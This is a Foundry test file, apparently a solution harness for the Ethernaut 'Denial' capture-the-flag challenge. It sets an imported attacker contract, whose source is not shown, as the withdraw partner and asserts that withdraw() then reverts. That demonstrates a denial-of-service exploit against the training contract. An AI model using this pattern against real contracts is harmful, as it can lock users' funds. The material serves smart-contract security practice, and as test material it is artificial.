// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/20-Denial.sol";
import "../src/attackers/20-DenialAttacker.sol";

contract DenialTest is Test {
    Denial public target;
    DenialAttacker public attacker;
    address player = vm.addr(1);

    function setUp() public {
        target = new Denial();
        attacker = new DenialAttacker(address(target));

        payable(address(target)).transfer(1 ether);

        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
    }

    function testDenial() public {
        vm.startPrank(address(player));

        target.setWithdrawPartner(address(attacker));

        (bool result, ) = address(target).call{gas: 1000000}(
            abi.encodeWithSignature("withdraw()")
        ); // Must revert

        assertFalse(result);

        vm.stopPrank();
    }
}
